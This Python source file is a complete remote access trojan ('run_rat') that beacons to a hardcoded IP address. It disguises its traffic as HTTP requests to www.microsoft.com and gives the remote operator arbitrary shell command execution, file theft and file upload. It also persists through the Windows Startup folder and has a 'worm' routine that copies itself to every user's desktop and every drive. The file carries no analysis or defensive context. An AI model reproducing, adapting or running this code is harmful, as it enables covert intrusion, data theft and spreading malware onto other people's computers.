import socket
import subprocess
import os
import time
import shutil
import sys
import json
import base64
import threading

def http_send(sock, data):
    if isinstance(data, bytes):
        body = base64.b64encode(data)
        length = len(body)
    else:
        body = base64.b64encode(data.encode())
        length = len(body)
    headers = (
        "POST /index.html HTTP/1.1\r\n"
        "Host: www.microsoft.com\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "Accept: */*\r\n"
        "Connection: keep-alive\r\n"
        f"Content-Length: {length}\r\n\r\n"
    ).encode()
    request = headers + body
    sock.sendall(request)

def http_recv(sock, as_bytes=False):
    response = b""
    while b"\r\n\r\n" not in response:
        response += sock.recv(4096)
    header, rest = response.split(b"\r\n\r\n", 1)
    content_length = 0
    for line in header.split(b"\r\n"):
        if line.lower().startswith(b"content-length:"):
            content_length = int(line.split(b":")[1].strip())
            break
    while len(rest) < content_length:
        rest += sock.recv(4096)
    data = rest[:content_length]
    # Fix: decode only if valid base64
    try:
        decoded = base64.b64decode(data, validate=True)
        if as_bytes:
            return decoded
        else:
            return decoded.decode(errors="ignore")
    except Exception:
        # fallback: decode as text
        return data.decode(errors="ignore")

def upload(sock, filename):
    try:
        with open(filename, "rb") as f:
            http_send(sock, f.read())
    except Exception as e:
        http_send(sock, f"UPLOAD ERROR: {e}")

def download(sock, filename):
    try:
        data = http_recv(sock, as_bytes=True)
        try:
            text = data.decode(errors="ignore")
            if text.startswith("UPLOAD ERROR") or text.startswith("DOWNLOAD ERROR"):
                return
        except Exception:
            pass
        with open(filename, "wb") as f:
            f.write(data)
    except Exception as e:
        http_send(sock, f"DOWNLOAD ERROR: {e}")

def copy_to_startup():
    startup = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
    script_path = os.path.abspath(sys.argv[0])
    dest_path = os.path.join(startup, os.path.basename(script_path))
    if script_path != dest_path:
        try:
            shutil.copyfile(script_path, dest_path)
        except Exception:
            pass

def copy_file_to_startup(filename):
    try:
        startup = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
        dest_path = os.path.join(startup, os.path.basename(filename))
        shutil.copyfile(filename, dest_path)
        return f"Copied {filename} to Startup"
    except Exception as e:
        return f"Copy to Startup failed: {e}"

def ensure_driverdetails_folder():
    roaming = os.environ.get("APPDATA")
    folder = os.path.join(roaming, "driverdetails")
    if not os.path.exists(folder):
        os.makedirs(folder)
    return folder

def upload_to_driverdetails(filename):
    try:
        folder = ensure_driverdetails_folder()
        dest_path = os.path.join(folder, os.path.basename(filename))
        shutil.copyfile(filename, dest_path)
        return f"Uploaded {filename} to {dest_path}"
    except Exception as e:
        return f"Upload to driverdetails failed: {e}"

def worm_spread():
    results = []
    script_path = os.path.abspath(sys.argv[0])
    try:
        users_dir = os.path.join(os.environ.get("SYSTEMDRIVE", "C:"), "Users")
        for user in os.listdir(users_dir):
            desktop = os.path.join(users_dir, user, "Desktop")
            if os.path.isdir(desktop):
                dest = os.path.join(desktop, os.path.basename(script_path))
                try:
                    shutil.copyfile(script_path, dest)
                    results.append(f"Copied to {dest}")
                except Exception as e:
                    results.append(f"Failed desktop {dest}: {e}")
    except Exception as e:
        results.append(f"Desktop spread error: {e}")
    try:
        for drive in [f"{chr(d)}:\\" for d in range(65, 91)]:
            if os.path.exists(drive):
                dest = os.path.join(drive, os.path.basename(script_path))
                try:
                    shutil.copyfile(script_path, dest)
                    results.append(f"Copied to {dest}")
                except Exception as e:
                    results.append(f"Failed drive {dest}: {e}")
    except Exception as e:
        results.append(f"Drive spread error: {e}")
    return "\n".join(results)

def list_dir(path):
    try:
        items = []
        for name in os.listdir(path):
            full = os.path.join(path, name)
            items.append({
                "name": name,
                "path": full,
                "is_dir": os.path.isdir(full)
            })
        return json.dumps(items)
    except Exception as e:
        return json.dumps([])

def background_execute(script, sock):
    try:
        subprocess.Popen([sys.executable, script], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        http_send(sock, f"Started {script} in background")
    except Exception as e:
        http_send(sock, f"BGEXECUTE ERROR: {e}")

pause_event = threading.Event()
pause_event.set()  # Start unpaused

def pause_for(seconds):
    pause_event.clear()
    time.sleep(seconds)
    pause_event.set()

def run_rat(server_ip, server_port):
    copy_to_startup()
    while True:
        if not pause_event.is_set():
            # Pause: Verbindung schließen, Port freigeben
            time.sleep(1)
            continue
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server_ip, server_port))
            last_keepalive = time.time()
            while pause_event.is_set():
                if time.time() - last_keepalive > 30:
                    http_send(s, "GET /keepalive HTTP/1.1\r\nHost: www.microsoft.com\r\n\r\n")
                    last_keepalive = time.time()
                try:
                    s.settimeout(1)
                    data = http_recv(s)
                    s.settimeout(None)
                except socket.timeout:
                    continue
                if not data:
                    break
                if data.lower() == "exit":
                    break
                elif data.startswith("clientpause "):
                    try:
                        seconds = int(data[len("clientpause "):].strip())
                        http_send(s, f"Client paused for {seconds} seconds")
                        s.close()  # Verbindung schließen, Port freigeben
                        pause_for(seconds)
                        break  # Schleife verlassen, nach Pause neu verbinden
                    except Exception as e:
                        http_send(s, f"CLIENTPAUSE ERROR: {e}")
                elif data.lower() == "resume":
                    pause_event.set()
                    http_send(s, "Client resumed")
                elif data.startswith("clientpauseall "):
                    try:
                        seconds = int(data[len("clientpauseall "):].strip())
                        http_send(s, f"Client paused for {seconds} seconds (all)")
                        s.close()
                        pause_for(seconds)
                        break
                    except Exception as e:
                        http_send(s, f"CLIENTPAUSEALL ERROR: {e}")
                elif data.lower() == "resumeall":
                    pause_event.set()
                    http_send(s, "Client resumed (all)")
                elif data.startswith("ls "):
                    path = data[3:].strip()
                    result = list_dir(path)
                    http_send(s, result)
                elif data.startswith("cd "):
                    try:
                        os.chdir(data[3:])
                        http_send(s, f"Changed directory to {os.getcwd()}")
                    except Exception as e:
                        http_send(s, str(e))
                elif data.startswith("download "):
                    filename = data[9:]
                    upload(s, filename)
                elif data.startswith("upload "):
                    filename = data[7:]
                    download(s, filename)
                    http_send(s, f"Uploaded {filename}")
                elif data.startswith("copytostartup "):
                    filename = data[len("copytostartup "):].strip()
                    result = copy_file_to_startup(filename)
                    http_send(s, result)
                elif data.lower().startswith("worm"):
                    result = worm_spread()
                    http_send(s, result)
                elif data.startswith("execute "):
                    script = data[len("execute "):].strip()
                    try:
                        output = subprocess.check_output([sys.executable, script], stderr=subprocess.STDOUT)
                        http_send(s, output.decode(errors="ignore"))
                    except Exception as e:
                        http_send(s, f"EXECUTE ERROR: {e}")
                elif data.startswith("uploadtofolder "):
                    filename = data[len("uploadtofolder "):].strip()
                    result = upload_to_driverdetails(filename)
                    http_send(s, result)
                elif data.startswith("command "):
                    shellcmd = data[len("command "):].strip()
                    try:
                        output = subprocess.check_output(shellcmd, shell=True, stderr=subprocess.STDOUT)
                        http_send(s, output.decode(errors="ignore"))
                    except Exception as e:
                        http_send(s, f"COMMAND ERROR: {e}")
                elif data.startswith("cat "):
                    filename = data[len("cat "):].strip()
                    try:
                        with open(filename, "r", encoding="utf-8", errors="ignore") as f:
                            content = f.read()
                        http_send(s, content)
                    except Exception as e:
                        http_send(s, f"CAT ERROR: {e}")
                elif data.startswith("bgexecute "):
                    script = data[len("bgexecute "):].strip()
                    t = threading.Thread(target=background_execute, args=(script, s), daemon=True)
                    t.start()
                else:
                    try:
                        output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
                        http_send(s, output.decode(errors="ignore"))
                    except Exception as e:
                        http_send(s, str(e))
            s.close()
        except Exception:
            time.sleep(10)
            continue

if __name__ == "__main__":
    run_rat("202.92.215.40", 80)
